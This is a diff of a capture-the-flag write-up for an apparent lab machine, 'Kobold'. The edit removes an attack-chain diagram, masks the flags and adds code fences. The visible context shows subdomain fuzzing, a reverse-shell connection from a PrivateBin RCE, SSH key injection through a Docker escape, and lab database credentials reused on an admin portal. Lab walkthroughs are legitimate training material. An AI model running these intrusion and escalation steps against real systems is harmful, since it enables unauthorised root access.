@@ -27,68 +27,6 @@ Kobold is a Easy difficulty Linux machine featuring multiple web applications an
 
 The machine demonstrates two different approaches to privilege escalation: an unintended Docker escape method and an intended path through the Arcane Portal administrative interface. Both paths highlight the importance of discovering exposed management interfaces and writable file locations.
 
-## Attack Chain Overview
-```bash
-10.129.245.50
-│
-▼
-Nmap
-│
-▼
-VHOST Enumeration
-│
-┌──┴──┐
-│ │
-▼ ▼
-mcp bin
-│ │
-│ MCPJam
-│ v1.4.2
-│
-▼
-CVE-2026-23744
-│
-▼
-RCE as ben
-│
-▼
-User Flag
-│
-┌──────────────────────────┐
-│ │
-▼ ▼
-Method 1: Method 2:
-Docker Escape Arcane Portal
-│ │
-▼ ▼
-SSH Key Injection privatebin Config
-│ │
-▼ ▼
-SSH as root CVE-2025-64714
-│ │
-▼ ▼
-Root Flag Shell as nobody
-│ │
-│ Read conf.php
-│ │
-│ Database Creds
-│ │
-│ Login Portal
-│ │
-│ Docker Container
-│ │
-│ Mount /host
-│ │
-│ Root Flag
-│ │
-└──────────────┬───────────┘
-│
-SSH as root
-│
-▼
-SYSTEM OWNED
-```
-
 ---
 
 ## Enumeration
@@ -122,11 +60,11 @@ ffuf -k -u https://kobold.htb/ \
   -w subdomains-top1million-20000.txt \
   -fs 154
 ```
-
+```bash
 **Discovered Subdomains:**
 - `mcp.kobold.htb` - MCPJam v1.4.2
 - `bin.kobold.htb` - privatebin 2.0.2
-
+```
 Added to `/etc/hosts`:
 
 ```bash
@@ -219,8 +157,7 @@ cat /home/ben/user.txt
 
 **User Flag:**
 
-85d27a643c5646bd56e1e8bbc3fcff1c
-
+85d27a643c5646bd***************
 
 ### Group Discovery
 
@@ -231,13 +168,13 @@ cat /etc/group
 ```
 
 **Key Groups:**
-
+```bash
 operator:x:37:ben,alice
 docker:x:111:alice
-
+```
 
 **Findings:** 
-- `ben` is in `operator` group
+- `ben and alice` are in `operator` group
 - `alice` is in `docker` group
 - `operator` group has access to sensitive directories
 
@@ -263,7 +200,7 @@ privatebin/nginx-fpm-alpine:2.0.2 \
 
 **Output:**
 
-5c7a6b6f4909f006b1d08d2b25d82c33
+5c7a6b6f4909f006****************
 
 
 #### SSH as root
@@ -300,10 +237,10 @@ privatebin/nginx-fpm-alpine:2.0.2 \
 ```
 
 **Output:**
-
+```bash
 PermitRootLogin yes
 PubkeyAuthentication yes
-
+```
 
 #### Setting Correct Permissions
 
@@ -326,10 +263,10 @@ privatebin/nginx-fpm-alpine:2.0.2 \
 ```
 
 **Output:**
-
+```bash
 drwx------ 2 root root 4096 Mar 15 21:23 /mnt/root/.ssh
 -rw------- 1 root root 93 Sep 13 11:11 authorized_keys
-
+```
 
 #### SSH as root
 
@@ -344,7 +281,7 @@ id
 # uid=0(root) gid=0(root) groups=0(root)
 
 cat /root/root.txt
-# 5c7a6b6f4909f006b1d08d2b25d82c33
+# 5c7a6b6f4909f006****************
 ```
 
 ![Docker Escape - Root Access](/assets/img/03-docker-escape-root.jpg)
@@ -362,11 +299,11 @@ find / -group operator -ls 2>/dev/null
 ```
 
 **Discovered:**
-
+```bash
 /privatebin-data/certs/key.pem (rwxrwx---)
 /privatebin-data/certs/cert.pem (rwxrwx---)
 /privatebin-data/data/ (rwxrwxrwx) ← WRITABLE
-
+```
 
 #### CVE-2025-64714 - privatebin 2.0.2 RCE
 
@@ -400,12 +337,12 @@ curl -sk \
 ```
 
 **Reverse Shell Connection:**
-
+```bash
 Connection received on 10.129.245.50 41391
 id
 
 uid=65534(nobody) gid=82(www-data) groups=82(www-data)
-
+```
 #### Reading Database Configuration
 
 Checked mounted filesystem:
@@ -426,12 +363,12 @@ cat /srv/cfg/conf.php
 ```
 
 **Extracted Credentials:**
-
+```bash
 [model_options]
 dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
 usr = "privatebin"
 pwd = "ComplexP@sswordAdmin1928"
-
+```
 
 #### Accessing Arcane Portal
 
@@ -440,10 +377,10 @@ Discovered Arcane Portal running on port 3552:
 ![Arcane Portal Login](/assets/img/04-arcane-portal.jpg)
 
 Logged in with extracted credentials:
-
+```bash
 User: arcane
 Password: ComplexP@sswordAdmin1928
-
+```
 
 #### Creating Privileged Container
 
@@ -466,7 +403,7 @@ Accessed container shell and navigated to mounted host filesystem:
 ```bash
 # Inside container
 cat /host/root/root.txt
-# 5c7a6b6f4909f006b1d08d2b25d82c33
+# 5c7a6b6f4909f006****************
 ```
 ![Root Access via Arcane Portal](/assets/img/08-root-final.jpg)
 
@@ -530,7 +467,7 @@ The combination of CVE-2025-64714 and writable storage directory allowed arbitra
 ---
 
 ## Comparison: Intended vs Unintended
-
+```bash
 | Aspect | Unintended (Docker) | Intended (Portal) |
 |--------|-------------------|------------------|
 | **Discovery** | Docker awareness | Web application enumeration |
@@ -538,7 +475,7 @@ The combination of CVE-2025-64714 and writable storage directory allowed arbitra
 | **Complexity** | Simple container commands | Multi-step portal navigation |
 | **Detection Difficulty** | Easier to detect | Blends with normal admin activity |
 | **Reliability** | Highly reliable | Depends on portal functionality |
-
+```
 Both paths demonstrate the importance of defense-in-depth: even with containerization, weak credentials and overpermissive volume mounts create security gaps.
 
 ---
